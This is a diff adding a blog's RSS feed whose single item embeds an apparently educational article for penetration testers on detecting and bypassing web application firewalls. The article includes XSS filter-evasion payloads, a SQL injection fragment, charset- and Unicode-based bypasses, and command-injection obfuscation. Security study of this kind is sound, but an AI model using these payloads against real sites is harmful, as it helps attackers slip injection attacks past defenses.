@@ -1,0 +1,173 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>WAF on Ally Petitt</title>
+    <link>https://ally-petitt.github.io/ally-petitt/tags/waf/</link>
+    <description>Recent content in WAF on Ally Petitt</description>
+    <generator>Hugo -- 0.125.4</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 01 Jun 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://ally-petitt.github.io/ally-petitt/tags/waf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>5 Ways I Bypassed Your Web Application Firewall (WAF)</title>
+      <link>https://ally-petitt.github.io/ally-petitt/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</link>
+      <pubDate>Thu, 01 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://ally-petitt.github.io/ally-petitt/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/</guid>
+      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.&lt;/p&gt;
+&lt;p&gt;WAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.&lt;/p&gt;
+&lt;p&gt;Depending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them &lt;a href=&#34;https://docs.python.org/3/library/re.html&#34;&gt;here&lt;/a&gt;. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.&lt;/p&gt;
+&lt;h1 id=&#34;identifying-wafs&#34;&gt;Identifying WAFs&lt;/h1&gt;
+&lt;h2 id=&#34;manually&#34;&gt;Manually&lt;/h2&gt;
+&lt;p&gt;As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as &lt;code&gt;https://example.com/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*lDR9M2gtJzPvOdWg&#34; alt=&#34;Picture of Cloudflare firewall blocking a webpage.&#34;  /&gt;
+
+Through a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The name of the WAF in the &lt;code&gt;Server&lt;/code&gt; header (e.g. &lt;code&gt;Server: cloudflare&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Additional HTTP response headers associated with the WAF (e.g. &lt;code&gt;CF-RAY: xxxxxxxxxxx&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Cookies that appear to be set by a WAF (e.g. the response header&lt;code&gt;Set-Cookie: __cfduid=xxxxx&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Unique response code upon submitting malicious requests. (e.g. &lt;code&gt;412&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a &lt;code&gt;FIN/RST&lt;/code&gt; TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.&lt;/p&gt;
+&lt;h2 id=&#34;automations&#34;&gt;Automations&lt;/h2&gt;
+&lt;p&gt;There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Running an Nmap Scan&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com  
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT  
+Nmap scan report for example.com (xxx.xxx.xxx.xxx)  
+Host is up (0.20s latency).  
+  
+PORT STATE SERVICE  
+443/tcp open https  
+| http-waf-detect: IDS/IPS/WAF detected:  
+|\_example.com:443/?p4yl04d3=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;  
+  
+Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WafW00f&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ wafw00f example.com 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8zeEz07TxwZ8VGBIaqxVvA.png&#34; alt=&#34;&#34;  /&gt;
+
+3. &lt;a href=&#34;https://github.com/Ekultek/WhatWaf&#34;&gt;WhatWaf&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;In addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_pCVKq8cL3ZTghqWG5BAyQ.png&#34; alt=&#34;&#34;  /&gt;
+
+The results from WhatWaf are consistent with those of Wafw00f.&lt;/p&gt;
+&lt;h1 id=&#34;bypassing-wafs&#34;&gt;Bypassing WAFs&lt;/h1&gt;
+&lt;p&gt;This section will outline some of the potential WAF bypass techniques with examples.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Bypassing Regex&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this &lt;a href=&#34;https://www.secforce.com/blog/bypassing-wafs-web-application-filters/&#34;&gt;article&lt;/a&gt; explains regex bypass through case studies.&lt;/p&gt;
+&lt;p&gt;Commmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using &lt;a href=&#34;https://www.aleksandrhovhannisyan.com/blog/crlf-vs-lf-normalizing-line-endings-in-git/&#34;&gt;linebreaks&lt;/a&gt; or tabs. The examples below demonstrate some approaches to bypassing regex with comments.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;sCrIpT&amp;gt;alert(XSS)&amp;lt;/sCriPt&amp;gt; #changing the case of the tag  
+&amp;lt;&amp;lt;script&amp;gt;alert(XSS)&amp;lt;/script&amp;gt; #prepending an additional &amp;#34;&amp;lt;&amp;#34;  
+&amp;lt;script&amp;gt;alert(XSS) // #removing the closing tag  
+&amp;lt;script&amp;gt;alert`XSS`&amp;lt;/script&amp;gt; #using backticks instead of parenetheses  
+java%0ascript:alert(1) #using encoded newline characters  
+&amp;lt;iframe src=http://malicous.com &amp;lt; #double open angle brackets  
+&amp;lt;STYLE&amp;gt;.classname{background-image:url(&amp;#34;javascript:alert(XSS)&amp;#34;);}&amp;lt;/STYLE&amp;gt; #uncommon tags  
+&amp;lt;img/src=1/onerror=alert(0)&amp;gt; #bypass space filter by using / where a space is expected  
+&amp;lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)&amp;gt;xss&amp;lt;/a&amp;gt; #extra characters
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;obfuscation&#34;&gt;Obfuscation&lt;/h2&gt;
+&lt;p&gt;While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Function(&amp;#34;ale&amp;#34;+&amp;#34;rt(1)&amp;#34;)(); #using uncommon functions besides alert, console.log, and prompt  
+javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding  
+&amp;lt;iframe src=&amp;#34;javascript:alert(`xss`)&amp;#34;&amp;gt; #unicode encoding  
+/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement  
+new Function`alt\`6\``; #using backticks instead of parentheses  
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript  
+%26%2397;lert(1) #using HTML encoding  
+&amp;lt;a src=&amp;#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)&amp;#34;&amp;gt; #Using Line Feed (LF) line breaks   
+&amp;lt;BODY onload!#$%&amp;amp;()*~+-\_.,:;?@[/|\]^`=confirm()&amp;gt; # use any chars that aren&amp;#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Additional resources include &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads&#34;&gt;PayloadsAllTheThings&lt;/a&gt; and &lt;a href=&#34;https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html&#34;&gt;OWASP&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;2-charsethttpsbookhacktricksxyznetwork-services-pentestingpentesting-webwaf-bypass&#34;&gt;&lt;a href=&#34;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass&#34;&gt;2. Charset&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ python3  
+-- snip --  
+&amp;gt;&amp;gt;&amp;gt; import urllib.parse  
+&amp;gt;&amp;gt;&amp;gt; s = &amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;xss&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;  
+&amp;gt;&amp;gt;&amp;gt; urllib.parse.quote\_plus(s.encode(&amp;#34;IBM037&amp;#34;))  
+&amp;#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The encoded string can then be sent in the request body and uploaded to the server.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /comment/post HTTP/1.1  
+Host: chatapp  
+Content-Type: application/x-www-form-urlencoded; charset=ibm500  
+Content-Length: 74  
+  
+%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Content Size&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Unicode Compatibility&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*khYe6n5QPB7ar2GG.jpg&#34; alt=&#34;&#34;  /&gt;
+
+&lt;em&gt;&lt;a href=&#34;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&#34;&gt;http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Unicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of &lt;a href=&#34;https://en.wikipedia.org/wiki/Unicode_equivalence&#34;&gt;unicode equivalence&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;For instance, the characters&lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character&lt;code&gt;/&lt;/code&gt;(U+002F) despite starting out as different characters. Digging deeper, whether &lt;code&gt;／&lt;/code&gt;(U+FF0F) and &lt;code&gt;/&lt;/code&gt; (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.&lt;/p&gt;
+&lt;p&gt;Characters are typically normalized through one of the four standard Unicode normalization algorithms:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;NFC:&lt;/strong&gt; Normalization Form Canonical Composition&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NFD:&lt;/strong&gt; Normalization Form Canonical Decomposition&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NFKC:&lt;/strong&gt; Normalization Form Compatibility Composition&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;NFKD:&lt;/strong&gt; Normalization Form Compatibility Decomposition&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details &lt;a href=&#34;https://www.unicode.org/reports/tr15/&#34;&gt;here&lt;/a&gt;). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. &lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;Jorge Lahara&lt;/a&gt; demonstrates this in the PoC webserver below.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from flask import Flask, abort, request  
+import unicodedata  
+from waf import waf  
+  
+app = Flask(\_\_name\_\_)  
+  
+  
+@app.route(&amp;#39;/&amp;#39;)  
+def Welcome\_name():  
+ name = request.args.get(&amp;#39;name&amp;#39;)  
+  
+  
+ if waf(name):  
+ abort(403, description=&amp;#34;XSS Detected&amp;#34;)  
+ else:  
+ name = unicodedata.normalize(&amp;#39;NFKD&amp;#39;, name) #NFC, NFKC, NFD, and NFKD  
+ return &amp;#39;Test XSS: &amp;#39; + name  
+  
+if \_\_name\_\_ == &amp;#39;\_\_main\_\_&amp;#39;:  
+ app.run(port=81)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Where the inial payload of &lt;code&gt;＜img src=p onerror=&#39;prompt(1)&#39;&amp;gt;&lt;/code&gt; may have been detected by the firewall, the payload constructed with Unicode-compatible characters (&lt;code&gt;＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥&lt;/code&gt;) would remain undetected.&lt;/p&gt;
+&lt;p&gt;Web servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found &lt;a href=&#34;https://www.compart.com/en/unicode&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;Uninitialized Variables&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;Another potential method is to use uninitialized variables in your request (e.g. &lt;code&gt;$u&lt;/code&gt;) as demonstrated in this &lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;article&lt;/a&gt;. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Dn2ov32HcZKKSE-4.png&#34; alt=&#34;&#34;  /&gt;
+
+&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/image-3.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/image-3.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;When on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*0jvcJnOSNRnOcYZJ.png&#34; alt=&#34;&#34;  /&gt;
+
+&lt;em&gt;&lt;a href=&#34;https://www.secjuice.com/content/images/2018/08/waf3_2.png&#34;&gt;https://www.secjuice.com/content/images/2018/08/waf3_2.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&#34;&gt;https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://jlajara.gitlab.io/Bypass_WAF_Unicode&#34;&gt;https://jlajara.gitlab.io/Bypass_WAF_Unicode&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&#34;&gt;https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.secjuice.com/web-application-firewall-waf-evasion/&#34;&gt;https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&#34;&gt;https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+  </channel>
+</rss>
